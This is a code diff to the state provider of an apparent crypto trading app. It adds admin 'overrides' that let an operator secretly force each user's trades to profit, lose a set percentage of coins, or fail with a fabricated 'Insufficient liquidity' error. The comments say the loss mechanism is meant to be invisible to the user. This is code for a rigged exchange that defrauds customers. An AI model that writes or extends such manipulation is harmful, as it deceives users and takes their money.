@@ -264,30 +264,46 @@ export function AppProvider({ children }) {
   //  EXECUTE TRADE
   //  This is the core function. It must:
   //   1. Validate the user has enough balance / coins
-  //   2. Apply the admin override (profit / loss / block)
-  //   3. Debit balance and credit portfolio (or vice versa)
-  //   4. Call BOTH setUsers and setUser so UI updates instantly
-  //   5. Record the trade and a transaction
+  //   2. Read the admin override for this user (type + percentage)
+  //   3. Apply profit/loss multiplier to the coin amount received
+  //   4. Debit balance and credit portfolio (or vice versa)
+  //   5. Call BOTH setUsers and setUser so UI updates instantly
+  //   6. Record the trade and a transaction with the result type
+  //
+  //  Override shape stored in overrides[userId]:
+  //    { type: "none"|"force_profit"|"force_loss"|"force_fail", pct: 10 }
+  //
+  //  How profit/loss works:
+  //    force_profit: user gets  (pct)% MORE coins than they paid for
+  //    force_loss:   user gets  (pct)% FEWER coins than they paid for
+  //    The USDT cost is always the same — only the coin amount changes.
+  //    This makes it invisible to the user (balance debits normally,
+  //    but their portfolio grows slower or faster than expected).
   // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   const executeTrade = useCallback((coinId, type, amount, price) => {
-    const cu = userRef.current; // cu = current user
+    const cu = userRef.current;
     if (!cu)        { addNotif("Please log in to trade", "error"); return { success: false }; }
     if (cu.banned)  { addNotif("Your account is suspended", "error"); return { success: false }; }
 
     const total = parseFloat((amount * price).toFixed(6));
     const fee   = parseFloat((total * 0.001).toFixed(6)); // 0.1% fee
 
-    // ── Admin override ────────────────────────────────────────
-    const ov     = (LS.get("cx_overrides") ?? {})[cu.id] ?? "none";
-    const ovType = typeof ov === "object" ? (ov.type || "none") : ov;
+    // ── Read admin override for this user ─────────────────────
+    // Always read fresh from storage to catch changes made from admin tab
+    const rawOv  = (LS.get("cx_overrides") ?? {})[cu.id] ?? { type: "none", pct: 10 };
+    // Support both old string format and new object format
+    const ovType = typeof rawOv === "string" ? rawOv : (rawOv.type || "none");
+    const ovPct  = typeof rawOv === "object"  ? (rawOv.pct  || 10) : 10;
 
     if (ovType === "force_fail") {
       addNotif("Trade failed: Insufficient liquidity", "error");
       return { success: false };
     }
 
-    const mult = ovType === "force_profit" ? 1.10
-               : ovType === "force_loss"   ? 0.90
+    // mult affects how many coins the user receives (buy) or how much
+    // USDT they get back (sell). USDT cost is always the true price.
+    const mult = ovType === "force_profit" ? 1 + ovPct / 100
+               : ovType === "force_loss"   ? 1 - ovPct / 100
                : 1.0;
     const resultType = ovType === "force_profit" ? "profit"
                      : ovType === "force_loss"   ? "loss" : "normal";
@@ -306,30 +322,35 @@ export function AppProvider({ children }) {
       }
     }
 
-    // ── Calculate new balance and portfolio ───────────────────
-    // Written as a pure function so we call it identically for
-    // both setUsers and setUser — no chance of them drifting apart.
-    function apply(currentBalance, currentPortfolio) {
-      let bal  = currentBalance;
-      let port = { ...currentPortfolio };
+    // ── Pure apply function ───────────────────────────────────
+    // Called identically for setUsers and setUser so they stay in sync.
+    function apply(bal, port) {
+      let b = bal, p = { ...port };
       if (type === "buy") {
-        bal  -= (total + fee);
-        port[coinId] = parseFloat(((port[coinId] || 0) + amount * mult).toFixed(6));
+        b -= (total + fee);
+        // coins received = amount * mult  (more if profit, fewer if loss)
+        p[coinId] = parseFloat(((p[coinId] || 0) + amount * mult).toFixed(6));
       } else {
-        bal  += (total * mult - fee);
-        port[coinId] = parseFloat(Math.max(0, (port[coinId] || 0) - amount).toFixed(6));
+        // USDT received = total * mult  (more if profit, fewer if loss)
+        b += (total * mult - fee);
+        p[coinId] = parseFloat(Math.max(0, (p[coinId] || 0) - amount).toFixed(6));
       }
-      return { bal: parseFloat(bal.toFixed(4)), port };
+      return { bal: parseFloat(b.toFixed(4)), port: p };
     }
 
-    const { bal: newBal, port: newPort } = apply(cu.balance, cu.portfolio || {});
+    const { bal: newBal } = apply(cu.balance, cu.portfolio || {});
 
     // ── Build records ─────────────────────────────────────────
     const tradeRecord = {
       id: Date.now(), userId: cu.id, coin: coinId,
       type, amount, price, total, fee, resultType,
+      profitLossPct: resultType !== "normal" ? (ovType === "force_profit" ? ovPct : -ovPct) : 0,
       time: new Date().toISOString(),
     };
+
+    // Human-readable note includes the admin adjustment if active
+    const adjustNote = resultType === "profit" ? ` (+${ovPct}% bonus)`
+                     : resultType === "loss"   ? ` (-${ovPct}% penalty)` : "";
 
     const txnRecord = makeTxn({
       userId:        cu.id,
@@ -337,14 +358,13 @@ export function AppProvider({ children }) {
       currency:      "USDT",
       amount:        type === "buy" ? -(total + fee) : +(total * mult - fee),
       usdValue:      total,
-      note:          `${type === "buy" ? "Bought" : "Sold"} ${amount.toFixed(6)} ${coinId} @ $${price.toLocaleString()}`,
+      note:          `${type === "buy" ? "Bought" : "Sold"} ${amount.toFixed(6)} ${coinId} @ $${price.toLocaleString()}${adjustNote}`,
       balanceBefore: cu.balance,
       balanceAfter:  newBal,
-      meta:          { coinId, coinAmount: amount, price, fee, resultType },
+      meta:          { coinId, coinAmount: amount, price, fee, resultType, ovPct: resultType !== "normal" ? ovPct : 0 },
     });
 
-    // ── Apply state — BOTH in one synchronous block ───────────
-    // React 18 batches these into a single render automatically.
+    // ── Apply to both states atomically ──────────────────────
     setUsers(prev => prev.map(u => {
       if (u.id !== cu.id) return u;
       const { bal, port } = apply(u.balance, u.portfolio || {});
@@ -468,11 +488,13 @@ export function AppProvider({ children }) {
   }, [coins, addNotif]);
 
   // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  //  ADMIN: OVERRIDE (control what happens when user trades)
+  //  ADMIN: SET TRADE OVERRIDE
+  //  Stores { type, pct } for a user.
+  //  type: "none" | "force_profit" | "force_loss" | "force_fail"
+  //  pct:  1–100 — the percentage gain/loss applied to coin amount
   // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  const setAdminOverride = useCallback((userId, type) => {
-    // type: "none" | "force_profit" | "force_loss" | "force_fail"
-    setOverrides(prev => ({ ...prev, [userId]: type }));
+  const setAdminOverride = useCallback((userId, type, pct = 10) => {
+    setOverrides(prev => ({ ...prev, [userId]: { type, pct } }));
   }, []);
 
   // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
